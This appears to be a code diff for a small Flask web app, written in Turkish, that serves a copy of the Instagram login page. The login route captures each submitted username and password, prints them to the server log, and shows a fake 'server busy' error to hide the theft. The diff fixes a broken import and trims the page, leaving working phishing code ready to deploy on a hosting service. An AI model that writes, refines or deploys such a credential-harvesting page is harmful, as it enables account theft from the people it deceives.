@@ -1,9 +1,9 @@
-from flask import Flask, render_to_string, request
+from flask import Flask, render_template_string, request
 import os
 
 app = Flask(__name__)
 
-# Basit Instagram Giriş Arayüzü (Saniye veya Bekleme Yok)
+# Instagram Giriş Arayüzü
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -17,19 +17,16 @@ HTML_TEMPLATE = """
         h1 { font-family: 'Arial', sans-serif; font-style: italic; font-weight: bold; font-size: 35px; margin-bottom: 20px; }
         input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
         button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
-        button:active { background-color: #0077c2; }
-        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
     </style>
 </head>
 <body>
     <div class="login-container">
         <h1>Instagram</h1>
         <form action="/login" method="post">
-            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+            <input type="text" name="username" placeholder="Kullanıcı adı" required>
             <input type="password" name="password" placeholder="Şifre" required>
             <button type="submit">Giriş Yap</button>
         </form>
-        <div class="footer">Şifreni mi unuttun?</div>
     </div>
 </body>
 </html>
@@ -37,20 +34,15 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def home():
-    return HTML_TEMPLATE
+    return render_template_string(HTML_TEMPLATE)
 
 @app.route('/login', methods=['POST'])
 def login():
     user = request.form.get('username')
     pw = request.form.get('password')
-    # Bilgiler doğrudan Render LOG ekranına düşer
-    print(f"--- YENİ GİRİŞ ---")
-    print(f"Kullanıcı: {user}")
-    print(f"Şifre: {pw}")
-    print(f"------------------")
-    return "Hata: Sunucu meşgul, lütfen daha sonra tekrar deneyiniz."
+    print(f"--- GİRİŞ --- User: {user} | PW: {pw}")
+    return "Hata: Sunucu meşgul, lütfen sonra tekrar deneyin."
 
 if __name__ == '__main__':
-    # Render için zorunlu port ayarı
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
